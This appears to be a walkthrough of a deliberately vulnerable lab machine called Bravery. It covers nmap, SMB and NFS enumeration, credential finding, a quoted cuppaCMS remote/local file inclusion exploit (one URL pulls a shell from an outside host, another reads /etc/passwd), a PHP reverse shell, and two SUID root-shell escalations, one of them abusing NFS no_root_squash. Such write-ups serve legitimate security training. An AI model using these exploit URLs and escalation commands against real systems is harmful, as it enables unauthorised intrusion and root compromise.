```
export IP=192.168.56.101
```
## Summary
1.
## Enumeration
<pre style="font-size: 12px";>
<font color=gray># nmap -p- -A -oN enum/tpc_scan 192.168.56.101</font>
PORT      STATE SERVICE     VERSION
<font color=red>22</font>/tcp    open  <font color=red>ssh</font>         <font color=red>OpenSSH 7.4</font> (protocol 2.0)
<font color=red>53</font>/tcp    open  <font color=red>domain</font>     <font color=red> dnsmasq 2.76</font>
| dns-nsid:
|_  bind.version: dnsmasq-2.76
<font color=red>80</font>/tcp    open  <font color=red>http</font>        Apache httpd<font color=red> 2.4.6</font> ((<font color=red>CentOS</font>) OpenSSL/1.0.2k-fips <font color=red>PHP/5.4.16</font>)
| http-methods:
|_  <font color=red>Potentially risky methods: TRACE</font>
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips <font color=red>PHP/5.4.16</font>
|_http-title: Apache HTTP Server Test Page powered by CentOS
<font color=red>111</font>/tcp   open  <font color=red>rpcbind</font>     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      34728/tcp   nlockmgr
|   100021  1,3,4      37320/udp6  nlockmgr
|   100021  1,3,4      46440/tcp6  nlockmgr
|   100021  1,3,4      50567/udp   nlockmgr
|   100024  1          42096/tcp   status
|   100024  1          44653/udp   status
|   100024  1          47809/udp6  status
|   100024  1          51023/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
<font color=red>139</font>/tcp   open  <font color=red>netbios-ssn</font> Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
<font color=red>443</font>/tcp   open <font color=red> ssl/http</font>    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
<font color=red>445</font>/tcp   open  <font color=red>netbios-ssn</font> Samba smbd<font color=red> 4.7.1</font> (workgroup: WORKGROUP)
<font color=red>2049</font>/tcp  open <font color=red> nfs_acl</font>     3 (RPC #100227)
<font color=red>3306</font>/tcp  open  <font color=red>mysql</font>       <font color=red>MariaDB</font> (unauthorized)
<font color=red>8080</font>/tcp  open  <font color=red>http</font>       <font color=red> nginx 1.12.2</font>
|_http-server-header: nginx/1.12.2
| http-robots.txt: 4 disallowed entries
|<font color=red>_/cgi-bin/ /qwertyuiop.html /private /public</font>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to Bravery! This is SPARTA!
<font color=red>20048</font>/tcp open  <font color=red>mountd</font>      1-3 (RPC #100005)
<font color=red>34728</font>/tcp open  <font color=red>nlockmgr</font>    1-4 (RPC #100021)
<font color=red>42096</font>/tcp open  <font color=red>status</font>      1 (RPC #100024)
Service Info: Host: BRAVERY
</pre>

<pre style="font-size: 12px";>
<font color=gray># nmap -p139,445 --script=smb-enum-shares $IP</font>
Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\192.168.56.101\IPC$: -> can't list files 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba Server 4.7.1)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\<font color=red><b>anonymous</b></font>:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: <font color=red>C:\samba\anonymous</font>
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.56.101\<font color=red><b>secured</b></font>:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path:<font color=red> C:\samba\secured</font>
|     Anonymous access: <none>
|_    Current user access: <none>
</pre>
<pre style="font-size: 12px";>
<font color=gray># enum4linux $IP</font>
..SNIP..
user:[<font color=red><b>david</b></font>] rid:[0x3e8]
user:[<font color=red><b>rick</b></font>] rid:[0x3e9]
..SNIP..
</pre>

<pre style="font-size: 12px";>
<font color=gray># nmap -p- --script nfs-* -oN enum/nfs_mount $IP</font>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-08 03:48 EDT
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.00039s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
<font color=red>111</font>/tcp   open  <font color=red>rpcbind</font>
| nfs-showmount:
|_  <b><font color=red>/var/nfsshare *</font></b>
139/tcp   open  netbios-ssn
443/tcp   open  https
</pre>

Mounting `/var/nfs/share` revealed a couple of interesting files such as these two.
![](../../Assets/images/Pasted%20image%2020220808160505.png)
![](../../Assets/images/Pasted%20image%2020220808160455.png)

Putting 2 and 2 together, I figured `qwertyuioplkjhgfdsazxcvbnm` can probably be used to access the `/secure` share. We also knew the users from previous smb enumeration. 

I was able to login with username david and stumble upon this file.

![](../../Assets/images/Pasted%20image%2020220808160429.png)

## Web Exploitation
Playing around with the new found website directory, I found a login page at `/genevieve/cuppaCMS/`.

![](../../Assets/images/Pasted%20image%2020220808162036.png)

Searching for public exploit, it was vulnerable to RFI and LFI. https://www.exploit-db.com/exploits/25971

![](../../Assets/images/Pasted%20image%2020220808162244.png)

<pre style="font-size: 12px";>
..SNIP..
#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt? -> <b><font color=red>RFI</font></b>
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd -> <font color=red>LFI</font>
..SNIP..
</pre>

We can now spin an http server then access a php reverse shell in our machine from RFI to get a reverse shell.  

![](../../Assets/images/Pasted%20image%2020220808163450.png)

![](../../Assets/images/Pasted%20image%2020220808163509.png)

## Privilege Escalation
### SUID
<pre style="font-size: 12px";>
bash-4.2$ echo 'int main() {setuid(0); system("/bin/bash"); return 0;}' > pwn.c
bash-4.2$ gcc pwn.c -o pwn
bash-4.2$ cp --attributes-only --preserve=all /usr/bin/cp pwn
bash-4.2$ ls -l
total 16
-rw<b>s</b>r-xr-x. 1 <b>root</b>   root   8496 Apr 11  2018 <b>pwn</b>
-rw-rw-rw-. 1 apache apache   55 Aug  8 13:23 pwn.c
bash-4.2$ ./pwn
[root@bravery tmp]# id
uid=0(root) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</pre>

## no_root_squash
<pre style="font-size: 12px";>
bash-4.2$ cat /etc/exports
/var/nfsshare  *(rw,sync,no_root_squash)
</pre>

In my machine:
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[/mnt/nfs]
└─$ su -
Password:
┌──(root㉿kali)-[~]
└─# clear
┌──(root㉿kali)-[~]
└─# cd /mnt/nfs/
┌──(root㉿kali)-[/mnt/nfs]
└─# echo 'int main() {setuid(0); system("/bin/bash"); return 0;}' > pwn.c
┌──(root㉿kali)-[/mnt/nfs]
└─# gcc pwn.c -o pwn
pwn.c: In function ‘main’:
pwn.c:1:13: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    1 | int main() {setuid(0); system("/bin/bash"); return 0;}
      |             ^~~~~~
pwn.c:1:24: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    1 | int main() {setuid(0); system("/bin/bash"); return 0;}
      |                        ^~~~~~
┌──(root㉿kali)-[/mnt/nfs]
└─# chmod +s pwn
</pre>

In target machine:
<pre style="font-size: 12px";>
bash-4.2$ ls -l
total 44
-rw-r--r--. 1 root root    15 Dec 26  2018 README.txt
-rw-r--r--. 1 root root    29 Dec 26  2018 discovery
-rw-r--r--. 1 root root    51 Dec 26  2018 enumeration
-rw-r--r--. 1 root root    20 Dec 26  2018 explore
drwxr-xr-x. 2 root root    19 Dec 26  2018 itinerary
-rw-r--r--. 1 root root   104 Dec 26  2018 password.txt
-rwsr-sr-x. 1 root root 16176 Aug  8 13:30 pwn
-rw-r--r--. 1 root root    55 Aug  8 13:30 pwn.c
-rw-r--r--. 1 root root    67 Dec 26  2018 qwertyuioplkjhgfdsazxcvbnm
bash-4.2$ ./pwn
[root@bravery nfsshare]# id
uid=0(root) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</pre>